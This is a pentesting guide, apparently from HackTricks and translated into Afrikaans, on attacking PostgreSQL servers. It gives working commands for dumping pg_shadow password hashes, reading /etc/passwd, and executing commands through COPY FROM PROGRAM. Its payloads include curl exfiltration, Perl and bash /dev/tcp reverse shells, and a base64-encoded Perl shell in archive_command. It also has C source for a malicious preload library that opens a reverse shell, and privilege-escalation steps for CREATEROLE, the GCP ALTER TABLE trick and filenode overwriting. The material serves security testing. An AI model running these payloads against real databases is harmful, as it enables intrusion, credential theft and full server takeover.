# 5432,5433 - Pentesting Postgresql


{{#include ../banners/hacktricks-training.md}}

## **Basiese Inligting**

**PostgreSQL** word beskryf as 'n **objek-relationele databasisstelsel** wat **oopbron** is. Hierdie stelsel gebruik nie net die SQL-taal nie, maar verbeter dit ook met bykomende kenmerke. Sy vermoëns stel dit in staat om 'n wye verskeidenheid datatipes en operasies te hanteer, wat dit 'n veelsydige keuse vir ontwikkelaars en organisasies maak.

**Standaard poort:** 5432, en as hierdie poort reeds in gebruik is, blyk dit dat postgresql die volgende poort (waarskynlik 5433) wat nie in gebruik is, sal gebruik.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Verbinding & Basiese Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> As jy **`\list`** uitvoer en 'n databasis genaamd **`rdsadmin`** vind, weet jy jy is binne 'n **AWS postgresql databasis**.

Vir meer inligting oor **hoe om 'n PostgreSQL databasis te misbruik**, kyk:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Outomatiese Enumerasie
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port skandering**

Volgens [**hierdie navorsing**](https://www.exploit-db.com/papers/13084), wanneer 'n verbindingspoging misluk, gooi `dblink` 'n `sqlclient_unable_to_establish_sqlconnection` uitsondering wat 'n verduideliking van die fout insluit. Voorbeelde van hierdie besonderhede word hieronder gelys.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Gasheer is af

`DETAIL: kon nie met die bediener verbind nie: Geen roete na gasheer. Is die bediener aan die gang op gasheer "1.2.3.4" en aanvaar TCP/IP verbindings op poort 5678?`

- Poort is gesluit
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Poort is oop
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
of
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Poort is oop of gefilterde
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL funksies is dit tans nie moontlik om uitsondering besonderhede te verkry nie. As jy egter direkte toegang tot die PostgreSQL bediener het, kan jy die nodige inligting verkry. As dit nie haalbaar is om gebruikersname en wagwoorde uit die stelseltabelle te onttrek nie, kan jy oorweeg om die woordlys aanvalmetode te gebruik wat in die vorige afdeling bespreek is, aangesien dit moontlik positiewe resultate kan lewer.

## Opname van Privileges

### Rolle

| Rol Tipes      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol het superuser privileges                                                                                                                        |
| rolinherit     | Rol erf outomaties die privileges van rolle waarvan dit 'n lid is                                                                                   |
| rolcreaterole  | Rol kan meer rolle skep                                                                                                                             |
| rolcreatedb    | Rol kan databasisse skep                                                                                                                            |
| rolcanlogin    | Rol kan aanmeld. Dit wil sê, hierdie rol kan as die aanvanklike sessie outorisering identifiseerder gegee word                                      |
| rolreplication | Rol is 'n replikasie rol. 'n Replikasie rol kan replikasie verbindings inisieer en replikasie slots skep en verwyder.                             |
| rolconnlimit   | Vir rolle wat kan aanmeld, stel dit die maksimum aantal gelyktydige verbindings wat hierdie rol kan maak. -1 beteken geen limiet.                   |
| rolpassword    | Nie die wagwoord nie (lees altyd as `********`)                                                                                                     |
| rolvaliduntil  | Wagwoord vervaldatum (slegs gebruik vir wagwoord outentisering); null as daar geen vervaldatum is                                                  |
| rolbypassrls   | Rol omseil elke ry-vlak sekuriteitsbeleid, sien [Afdeling 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) vir meer inligting.   |
| rolconfig      | Rol-spesifieke standaardinstellings vir tydens uitvoering konfigurasie veranderlikes                                                                  |
| oid            | ID van rol                                                                                                                                           |

#### Interessante Groepe

- As jy 'n lid van **`pg_execute_server_program`** is, kan jy **uitvoer** programme
- As jy 'n lid van **`pg_read_server_files`** is, kan jy **lees** lêers
- As jy 'n lid van **`pg_write_server_files`** is, kan jy **skryf** lêers

> [!NOTE]
> Let daarop dat in Postgres 'n **gebruiker**, 'n **groep** en 'n **rol** die **dieselfde** is. Dit hang net af van **hoe jy dit gebruik** en of jy dit **toelaat om aan te meld**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabels
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funksies
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Lêerstelsel aksies

### Lees gidse en lêers

Van hierdie [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) kan lede van die gedefinieerde **`DEFAULT_ROLE_READ_SERVER_FILES`** groep (genoem **`pg_read_server_files`**) en **super gebruikers** die **`COPY`** metode op enige pad gebruik (kyk na `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Onthou dat as jy nie 'n super gebruiker is nie, maar die **CREATEROLE** toestemmings het, kan jy **jouself lid van daardie groep maak:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Daar is **ander postgres funksies** wat gebruik kan word om **lêers te lees of 'n gids te lys**. Slegs **supergebruikers** en **gebruikers met eksplisiete toestemmings** kan dit gebruik:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
U kan **meer funksies** vind in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Eenvoudige Lêer Skryf

Slegs **super gebruikers** en lede van **`pg_write_server_files`** kan kopie gebruik om lêers te skryf.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Onthou dat as jy nie 'n super gebruiker is nie, maar die **`CREATEROLE`** regte het, kan jy **jouself 'n lid van daardie groep maak:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Onthou dat COPY nie nuwe reël karakters kan hanteer nie, daarom, selfs al gebruik jy 'n base64 payload, **moet jy 'n een-liner stuur**.\
'n Baie belangrike beperking van hierdie tegniek is dat **`copy` nie gebruik kan word om binêre lêers te skryf nie, aangesien dit sommige binêre waardes verander.**

### **Binêre lêers opgelaai**

Daar is egter **ander tegnieke om groot binêre lêers op te laai:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Opdateer PostgreSQL tabeldata via plaaslike lêer skryf

As jy die nodige regte het om PostgreSQL bediener lêers te lees en te skryf, kan jy enige tabel op die bediener opdateer deur **die geassosieerde lêer node te oorskryf** in [die PostgreSQL data gids](https://www.postgresql.org/docs/8.1/storage.html). **Meer oor hierdie tegniek** [**hier**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Vereiste stappe:

1.  Verkry die PostgreSQL data gids

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** As jy nie die huidige data gids pad uit instellings kan verkry nie, kan jy die hoof PostgreSQL weergawe deur die `SELECT version()` navraag opsoek en probeer om die pad te brute-force. Algemene data gids pades op Unix installasies van PostgreSQL is `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. 'n Algemene kluster naam is `main`.

2.  Verkry 'n relatiewe pad na die filenode, geassosieer met die teiken tabel

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Hierdie navraag moet iets soos `base/3/1337` teruggee. Die volle pad op skyf sal wees `$DATA_DIRECTORY/base/3/1337`, d.w.s. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Laai die filenode af deur die `lo_*` funksies

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Kry die datatype, geassosieer met die teiken tabel

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) om [die filenode te redigeer](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); stel alle `rol*` booleaanse vlae op 1 vir volle regte.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Herlaai die geredigeerde filenode via die `lo_*` funksies, en oorskryf die oorspronklike lêer op die skyf

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opsioneel)_ Maak die in-geheue tabel kas skoon deur 'n duur SQL navraag te loop

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Jy behoort nou opdatering tabelwaardes in die PostgreSQL te sien.

Jy kan ook 'n superadmin word deur die `pg_authid` tabel te redigeer. **Sien** [**die volgende afdeling**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE na program**

Sedert [weergawe 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), kan slegs **super gebruikers** en lede van die groep **`pg_execute_server_program`** copy gebruik vir RCE (voorbeeld met eksfiltrasie:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Voorbeeld om uit te voer:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Onthou dat as jy nie 'n super gebruiker is nie, maar die **`CREATEROLE`** toestemmings het, kan jy **jouself lid van daardie groep maak:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Of gebruik die `multi/postgres/postgres_copy_from_program_cmd_exec` module van **metasploit**.\
Meer inligting oor hierdie kwesbaarheid [**hier**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Terwyl dit as CVE-2019-9193 gerapporteer is, het Postges verklaar dat dit 'n [kenmerk was en nie reggestel sal word nie](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE met PostgreSQL Tale

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE met PostgreSQL uitbreidings

Sodra jy **geleer** het uit die vorige pos **hoe om binêre lêers op te laai**, kan jy probeer om **RCE te verkry deur 'n postgresql-uitbreiding op te laai en dit te laai**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL konfigurasie lêer RCE

> [!NOTE]
> Die volgende RCE vektore is veral nuttig in beperkte SQLi kontekste, aangesien alle stappe deur geneste SELECT verklarings uitgevoer kan word

Die **konfigurasie lêer** van PostgreSQL is **skryfbaar** deur die **postgres gebruiker**, wat die een is wat die databasis bestuur, so as **supergebruiker**, kan jy lêers in die lêerstelsel skryf, en daarom kan jy **hierdie lêer oorskryf.**

![](<../images/image (322).png>)

#### **RCE met ssl_passphrase_command**

Meer inligting [oor hierdie tegniek hier](https://pulsesecurity.co.nz/articles/postgres-sqli).

Die konfigurasie lêer het 'n paar interessante eienskappe wat tot RCE kan lei:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Pad na die privaat sleutel van die databasis
- `ssl_passphrase_command = ''` As die privaat lêer deur 'n wagwoord beskerm word (geënkripteer), sal postgresql die **opdrag wat in hierdie eienskap aangedui word** **uitvoer**.
- `ssl_passphrase_command_supports_reload = off` **As** hierdie eienskap **aan** is, sal die **opdrag** wat uitgevoer word as die sleutel deur 'n wagwoord beskerm word, **uitgevoer word** wanneer `pg_reload_conf()` **uitgevoer** word.

Dan sal 'n aanvaller moet:

1. **Dump privaat sleutel** van die bediener
2. **Enkripteer** afgelaaide privaat sleutel:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Oorskryf**
4. **Dump** die huidige postgresql **konfigurasie**
5. **Oorskryf** die **konfigurasie** met die genoemde eienskappe konfigurasie:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Voer `pg_reload_conf()` uit

Terwyl ek dit getoets het, het ek opgemerk dat dit slegs sal werk as die **privaat sleutel lêer 640 toestemmings het**, dit is **besit deur root** en deur die **groep ssl-cert of postgres** (sodat die postgres gebruiker dit kan lees), en is geplaas in _/var/lib/postgresql/12/main_.

#### **RCE met archive_command**

**Meer** [**inligting oor hierdie konfig en oor WAL hier**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Nog 'n eienskap in die konfigurasie lêer wat uitgebuit kan word, is `archive_command`.

Vir dit om te werk, moet die `archive_mode` instelling `'on'` of `'always'` wees. As dit waar is, kan ons die opdrag in `archive_command` oorskryf en dit dwing om uit te voer via die WAL (write-ahead logging) operasies.

Die algemene stappe is:

1. Kontroleer of archive mode geaktiveer is: `SELECT current_setting('archive_mode')`
2. Oorskryf `archive_command` met die payload. Byvoorbeeld, 'n omgekeerde skulp: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Herlaai die konfigurasie: `SELECT pg_reload_conf()`
4. Dwing die WAL operasie om te loop, wat die archive command sal aanroep: `SELECT pg_switch_wal()` of `SELECT pg_switch_xlog()` vir sommige Postgres weergawes

#### **RCE met preload biblioteke**

Meer inligting [oor hierdie tegniek hier](https://adeadfed.com/posts/postgresql-select-only-rce/).

Hierdie aanvalsvector maak gebruik van die volgende konfigurasie veranderlikes:

- `session_preload_libraries` -- biblioteke wat deur die PostgreSQL bediener by die kliëntverbinding gelaai sal word.
- `dynamic_library_path` -- lys van gidse waar die PostgreSQL bediener vir die biblioteke sal soek.

Ons kan die `dynamic_library_path` waarde stel na 'n gids, skryfbaar deur die `postgres` gebruiker wat die databasis bestuur, byvoorbeeld, `/tmp/` gids, en 'n kwaadwillige `.so` objek daar op laai. Volgende, sal ons die PostgreSQL bediener dwing om ons nuut opgelaaide biblioteek te laai deur dit in die `session_preload_libraries` veranderlike in te sluit.

Die aanval stappe is:

1. Laai die oorspronklike `postgresql.conf` af
2. Sluit die `/tmp/` gids in die `dynamic_library_path` waarde in, byvoorbeeld `dynamic_library_path = '/tmp:$libdir'`
3. Sluit die kwaadwillige biblioteeknaam in die `session_preload_libraries` waarde in, byvoorbeeld `session_preload_libraries = 'payload.so'`
4. Kontroleer die groot PostgreSQL weergawe via die `SELECT version()` navraag
5. Compileer die kwaadwillige biblioteekkode met die korrekte PostgreSQL ontwikkelingspakket Voorbeeldkode:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Die kode compileer:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Laai die kwaadwillige `postgresql.conf`, geskep in stappe 2-3, en oorskryf die oorspronklike een
7. Laai die `payload.so` van stap 5 na die `/tmp` gids
8. Herlaai die bediener konfigurasie deur die bediener te herbegin of die `SELECT pg_reload_conf()` navraag aan te roep
9. By die volgende DB verbinding, sal jy die omgekeerde skulp verbinding ontvang.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Volgens die [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Rolles wat die **`CREATEROLE`** voorreg het, kan **lidmaatskap in enige rol toeken of intrek** wat **nie** 'n **supergebruiker** is nie._

So, as jy **`CREATEROLE`** toestemming het, kan jy jouself toegang tot ander **rolle** (wat nie supergebruiker is nie) gee wat jou die opsie kan gee om lêers te lees en te skryf en opdragte uit te voer:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Wysig Wagwoord

Gebruikers met hierdie rol kan ook **verander** die **wagwoorde** van ander **nie-supergebruikers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc na SUPERUSER

Dit is redelik algemeen om te vind dat **lokale gebruikers in PostgreSQL kan aanmeld sonder om enige wagwoord te verskaf**. Daarom, sodra jy **toestemming om kode uit te voer** versamel het, kan jy hierdie toestemmings misbruik om jou **`SUPERUSER`** rol te verleen:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Dit is gewoonlik moontlik weens die volgende lyne in die **`pg_hba.conf`** lêer:
>
> ```bash
> # "local" is vir Unix domein sokket verbindings slegs
> local   all             all                                     trust
> # IPv4 plaaslike verbindings:
> host    all             all             127.0.0.1/32            trust
> # IPv6 plaaslike verbindings:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**hierdie skrywe**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) word verduidelik hoe dit moontlik was om **privesc** in Postgres GCP te verkry deur die ALTER TABLE voorreg wat aan die gebruiker toegeken is.

Wanneer jy probeer om **'n ander gebruiker die eienaar van 'n tabel te maak**, behoort jy 'n **fout** te ontvang wat dit verhinder, maar blykbaar het GCP daardie **opsie aan die nie-superuser postgres gebruiker** in GCP gegee:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Om hierdie idee te kombineer met die feit dat wanneer die **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) op 'n **tabel met 'n indeks funksie** uitgevoer word, word die **funksie** **aangeroep** as deel van die opdrag met die **tabel** **eienaar se toestemmings**. Dit is moontlik om 'n indeks met 'n funksie te skep en eienaarstoestemmings aan 'n **super gebruiker** oor daardie tabel te gee, en dan ANALYZE oor die tabel met die kwaadwillige funksie uit te voer wat in staat sal wees om opdragte uit te voer omdat dit die voorregte van die eienaar gebruik.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitatie

1. Begin deur 'n nuwe tabel te skep.
2. Voeg 'n paar irrelevante inhoud in die tabel in om data vir die indeksfunksie te verskaf.
3. Ontwikkel 'n kwaadwillige indeksfunksie wat 'n kode-uitvoeringspayload bevat, wat toelaat dat ongeoorloofde opdragte uitgevoer word.
4. ALTER die tabel se eienaar na "cloudsqladmin," wat GCP se superuser rol is wat eksklusief deur Cloud SQL gebruik word om die databasis te bestuur en te onderhou.
5. Voer 'n ANALYZE operasie op die tabel uit. Hierdie aksie dwing die PostgreSQL enjin om na die gebruikerskonteks van die tabel se eienaar, "cloudsqladmin," oor te skakel. Gevolglik word die kwaadwillige indeksfunksie met die regte van "cloudsqladmin" aangeroep, wat die uitvoering van die voorheen ongeoorloofde shell-opdrag moontlik maak.

In PostgreSQL lyk hierdie vloei iets soos hierdie:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Dan sal die `shell_commands_results` tabel die uitvoer van die uitgevoerde kode bevat:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Plaaslike Aanmelding

Sommige verkeerd geconfigureerde postgresql instansies mag die aanmelding van enige plaaslike gebruiker toelaat, dit is moontlik om plaaslik vanaf 127.0.0.1 te teken met die **`dblink` funksie**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Let daarop dat vir die vorige navraag om te werk **die funksie `dblink` moet bestaan**. As dit nie bestaan nie, kan jy probeer om dit te skep met
>
> ```sql
> CREATE EXTENSION dblink;
> ```

As jy die wagwoord van 'n gebruiker met meer bevoegdhede het, maar die gebruiker mag nie vanaf 'n eksterne IP aanmeld nie, kan jy die volgende funksie gebruik om navrae as daardie gebruiker uit te voer:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Dit is moontlik om te kontroleer of hierdie funksie bestaan met:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Aangepaste gedefinieerde funksie met** SECURITY DEFINER

[**In hierdie skrywe**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), kon pentesters privesc binne 'n postgres-instansie wat deur IBM verskaf is, omdat hulle **hierdie funksie met die SECURITY DEFINER-vlag gevind het**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Soos [**in die dokumentasie verduidelik**](https://www.postgresql.org/docs/current/sql-createfunction.html) word 'n funksie met **SECURITY DEFINER uitgevoer** met die voorregte van die **gebruiker wat dit besit**. Daarom, as die funksie **kwulnerabel is vir SQL-inspuiting** of sekere **voorregte aksies uitvoer met parameters wat deur die aanvaller beheer word**, kan dit misbruik word om **voorregte binne postgres te eskaleer**.

In lyn 4 van die vorige kode kan jy sien dat die funksie die **SECURITY DEFINER** vlag het.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
En dan **voer opdragte uit**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pas Burteforce met PL/pgSQL

**PL/pgSQL** is 'n **volledig funksionele programmeertaal** wat groter prosedurele beheer bied in vergelyking met SQL. Dit stel die gebruik van **lusse** en ander **beheersstrukture** in staat om programlogika te verbeter. Daarbenewens het **SQL-verklarings** en **triggers** die vermoë om funksies aan te roep wat geskep is met die **PL/pgSQL-taal**. Hierdie integrasie stel 'n meer omvattende en veelsydige benadering tot databasisprogrammering en outomatisering in staat.\
**Jy kan hierdie taal misbruik om PostgreSQL te vra om die gebruikers se akrediteer te brute-force.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc deur Interne PostgreSQL Tabels Oor te Skryf

> [!NOTE]
> Die volgende privesc-vak is veral nuttig in beperkte SQLi-kontekste, aangesien alle stappe deur geneste SELECT-verklarings uitgevoer kan word

As jy **PostgreSQL-bediener lêers kan lees en skryf**, kan jy **'n superuser** word deur die PostgreSQL op-disk filenode, wat geassosieer is met die interne `pg_authid` tabel, oor te skryf.

Lees meer oor **hierdie tegniek** [**hier**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Die aanvalstappe is:

1. Verkry die PostgreSQL datadirektories
2. Verkry 'n relatiewe pad na die filenode, geassosieer met die `pg_authid` tabel
